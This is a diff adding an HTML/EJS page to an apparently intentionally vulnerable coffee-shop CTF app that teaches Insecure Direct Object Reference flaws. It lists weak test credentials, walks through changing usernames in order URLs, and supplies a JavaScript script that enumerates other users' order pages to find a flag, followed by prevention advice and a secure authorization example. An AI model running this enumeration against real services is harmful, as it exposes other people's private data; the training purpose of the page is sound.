@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IDOR Exploitation Demo - Coffee Shop CTF</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    .exploit-card {
+      border-left: 4px solid #dc3545;
+    }
+
+    .success-card {
+      border-left: 4px solid #28a745;
+    }
+
+    .code-block {
+      background-color: #f8f9fa;
+      border: 1px solid #dee2e6;
+      border-radius: 0.375rem;
+      padding: 1rem;
+      margin: 1rem 0;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+
+<body>
+  <%- include('../partials/navbar') %>
+
+    <div class="container mt-4">
+      <div class="row">
+        <div class="col-12">
+          <h1 class="text-center mb-4">🎯 IDOR (Insecure Direct Object References) Demo</h1>
+
+          <div class="alert alert-warning">
+            <h5>🚨 Vulnerability Explanation</h5>
+            <p>IDOR occurs when an application provides direct access to objects based on user input without proper
+              authorization checks. This allows attackers to access other users' data by simply changing URL parameters.
+            </p>
+          </div>
+
+          <!-- Prerequisites -->
+          <div class="card mb-4">
+            <div class="card-header bg-info text-white">
+              <h5><i class="fas fa-exclamation-triangle"></i> Prerequisites</h5>
+            </div>
+            <div class="card-body">
+              <ol>
+                <li><strong>Login Required:</strong> You must be logged in to access order endpoints</li>
+                <li><strong>Test Accounts Available:</strong></li>
+                <ul>
+                  <li>admin / admin123</li>
+                  <li>testuser / password123</li>
+                  <li>john / secret</li>
+                </ul>
+              </ol>
+            </div>
+          </div>
+
+          <!-- Manual Exploitation -->
+          <div class="card exploit-card mb-4">
+            <div class="card-header bg-danger text-white">
+              <h5><i class="fas fa-bug"></i> Manual Exploitation Methods</h5>
+            </div>
+            <div class="card-body">
+              <h6>Method 1: Browser Address Bar</h6>
+              <ol>
+                <li>Login as any user (e.g., testuser/password123)</li>
+                <li>Navigate to your own orders: <code>/order/view/testuser</code></li>
+                <li>Change the username in the URL to access other users:</li>
+                <ul>
+                  <li><a href="/order/view/admin" target="_blank">/order/view/admin</a></li>
+                  <li><a href="/order/view/john" target="_blank">/order/view/john</a></li>
+                  <li><a href="/order/view/testuser" target="_blank">/order/view/testuser</a></li>
+                </ul>
+              </ol>
+
+              <h6>Method 2: Automated Testing</h6>
+              <button class="btn btn-danger" onclick="testIDOR()">
+                <i class="fas fa-play"></i> Run IDOR Test
+              </button>
+              <div id="results" class="mt-3"></div>
+            </div>
+          </div>
+
+          <!-- Expected Results -->
+          <div class="card success-card mb-4">
+            <div class="card-header bg-success text-white">
+              <h5><i class="fas fa-flag"></i> Expected Results</h5>
+            </div>
+            <div class="card-body">
+              <p><strong>Successful IDOR exploitation will show:</strong></p>
+              <ul>
+                <li>🚩 <strong>CTF Flag:</strong> <code>flag{idor_vulnerability_found}</code></li>
+                <li>📋 Other users' order history</li>
+                <li>💳 Sensitive information like order details, amounts, etc.</li>
+                <li>👤 User information for accounts you shouldn't have access to</li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- JavaScript Exploitation -->
+          <div class="card mb-4">
+            <div class="card-header bg-warning text-dark">
+              <h5><i class="fas fa-code"></i> JavaScript Exploitation Code</h5>
+            </div>
+            <div class="card-body">
+              <p>Copy and paste this code into the browser console (F12):</p>
+              <div class="code-block">
+                // IDOR Vulnerability Test Script
+                const testIDOR = async () => {
+                console.log('🎯 Testing IDOR vulnerability...');
+
+                const userIds = ['admin', 'testuser', 'john', 'user1', 'manager'];
+                const results = [];
+
+                for (const userId of userIds) {
+                try {
+                const response = await fetch(`/order/view/${userId}`);
+
+                if (response.ok) {
+                const data = await response.text();
+                console.log(`✅ SUCCESS - Accessed orders for: ${userId}`);
+
+                // Check for flag
+                if (data.includes('flag{idor_vulnerability_found}')) {
+                console.log('🚩 FLAG FOUND: flag{idor_vulnerability_found}');
+                }
+
+                results.push({userId, status: 'SUCCESS', hasFlag: data.includes('flag{')});
+                } else {
+                console.log(`❌ FAILED - ${userId}: ${response.status}`);
+                results.push({userId, status: 'FAILED', statusCode: response.status});
+                }
+
+                } catch (error) {
+                console.log(`❌ ERROR - ${userId}: ${error.message}`);
+                }
+
+                // Small delay between requests
+                await new Promise(resolve => setTimeout(resolve, 200));
+                }
+
+                console.log('🎯 IDOR Test Complete:', results);
+                return results;
+                };
+
+                // Run the test
+                testIDOR();
+              </div>
+              <button class="btn btn-primary" onclick="copyCode()">
+                <i class="fas fa-copy"></i> Copy Code
+              </button>
+            </div>
+          </div>
+
+          <!-- Mitigation -->
+          <div class="card mb-4">
+            <div class="card-header bg-secondary text-white">
+              <h5><i class="fas fa-shield-alt"></i> How to Prevent IDOR</h5>
+            </div>
+            <div class="card-body">
+              <ul>
+                <li><strong>Authorization checks:</strong> Verify the user has permission to access the requested
+                  resource</li>
+                <li><strong>Use session data:</strong> Get user ID from authenticated session, not URL parameters</li>
+                <li><strong>Indirect references:</strong> Use random tokens instead of predictable IDs</li>
+                <li><strong>Access control lists:</strong> Implement proper ACL checks before serving data</li>
+              </ul>
+
+              <h6>Secure Code Example:</h6>
+              <div class="code-block">
+                // SECURE - Check if user owns the resource
+                router.get('/view/:userId', authenticate, async (req, res) => {
+                const requestedUserId = req.params.userId;
+                const currentUserId = req.user.userId;
+
+                // Authorization check
+                if (requestedUserId !== currentUserId && req.user.role !== 'admin') {
+                return res.status(403).json({error: 'Access denied'});
+                }
+
+                // Proceed with request...
+                });
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+    <script>
+      // IDOR Test Function (same as above but integrated)
+      async function testIDOR() {
+        const resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = '<div class="spinner-border text-primary" role="status"><span class="visually-hidden">Testing...</span></div>';
+
+        const userIds = ['admin', 'testuser', 'john', 'user1', 'manager'];
+        const results = [];
+        let resultsHTML = '<h6>IDOR Test Results:</h6><ul class="list-group">';
+
+        for (const userId of userIds) {
+          try {
+            const response = await fetch(`/order/view/${userId}`);
+
+            if (response.ok) {
+              const data = await response.text();
+              const hasFlag = data.includes('flag{idor_vulnerability_found}');
+
+              resultsHTML += `
+                            <li class="list-group-item list-group-item-success">
+                                <strong>✅ ${userId}</strong> - Access granted
+                                ${hasFlag ? '<span class="badge bg-warning text-dark ms-2">🚩 FLAG FOUND</span>' : ''}
+                                <a href="/order/view/${userId}" target="_blank" class="btn btn-sm btn-outline-primary ms-2">View Orders</a>
+                            </li>
+                        `;
+
+              results.push({ userId, status: 'SUCCESS', hasFlag });
+            } else {
+              resultsHTML += `
+                            <li class="list-group-item list-group-item-danger">
+                                <strong>❌ ${userId}</strong> - Access denied (${response.status})
+                            </li>
+                        `;
+              results.push({ userId, status: 'FAILED', statusCode: response.status });
+            }
+
+          } catch (error) {
+            resultsHTML += `
+                        <li class="list-group-item list-group-item-warning">
+                            <strong>⚠️ ${userId}</strong> - Error: ${error.message}
+                        </li>
+                    `;
+          }
+
+          await new Promise(resolve => setTimeout(resolve, 200));
+        }
+
+        resultsHTML += '</ul>';
+
+        if (results.some(r => r.hasFlag)) {
+          resultsHTML += '<div class="alert alert-success mt-3"><h6>🎉 Congratulations!</h6><p>You successfully exploited the IDOR vulnerability and found the flag!</p></div>';
+        }
+
+        resultsDiv.innerHTML = resultsHTML;
+      }
+
+      function copyCode() {
+        const code = `// IDOR Vulnerability Test Script
+const testIDOR = async () => {
+    console.log('🎯 Testing IDOR vulnerability...');
+    
+    const userIds = ['admin', 'testuser', 'john', 'user1', 'manager'];
+    
+    for (const userId of userIds) {
+        try {
+            const response = await fetch(\`/order/view/\${userId}\`);
+            
+            if (response.ok) {
+                const data = await response.text();
+                console.log(\`✅ SUCCESS - Accessed orders for: \${userId}\`);
+                
+                if (data.includes('flag{idor_vulnerability_found}')) {
+                    console.log('🚩 FLAG FOUND: flag{idor_vulnerability_found}');
+                }
+            } else {
+                console.log(\`❌ FAILED - \${userId}: \${response.status}\`);
+            }
+        } catch (error) {
+            console.log(\`❌ ERROR - \${userId}: \${error.message}\`);
+        }
+        
+        await new Promise(resolve => setTimeout(resolve, 200));
+    }
+};
+
+testIDOR();`;
+
+        navigator.clipboard.writeText(code).then(() => {
+          alert('Code copied to clipboard!');
+        });
+      }
+    </script>
+</body>
+
+</html>
